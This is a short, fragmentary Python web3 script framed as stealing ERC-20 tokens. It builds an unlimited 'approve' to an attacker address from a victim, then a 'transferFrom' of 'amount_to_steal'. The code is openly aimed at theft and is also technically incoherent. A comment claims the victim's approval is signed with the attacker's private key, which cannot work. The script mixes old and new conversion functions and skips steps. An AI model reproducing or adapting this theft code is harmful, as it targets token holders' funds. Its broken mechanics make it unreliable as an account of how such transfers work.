...
tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
    "from": victim,  # Victim's address here
    "nonce": w3.eth.get_transaction_count(victim),
    "gas": 200000,
    "gasPrice": w3.toWei("5", "gwei")
})

# Step 2: Sign the approval transaction with the attacker's private key
...
tx2 = token.functions.transferFrom(victim, attacker, amount_to_steal).build_transaction({
    "from": attacker,  # Attacker's address here for transferFrom
    "nonce": w3.eth.get_transaction_count(attacker),
    "gas": 200000,
    "gasPrice": w3.to_wei("5", "gwei")
})

# Step 5: Sign the transfer transaction with the attacker's private key
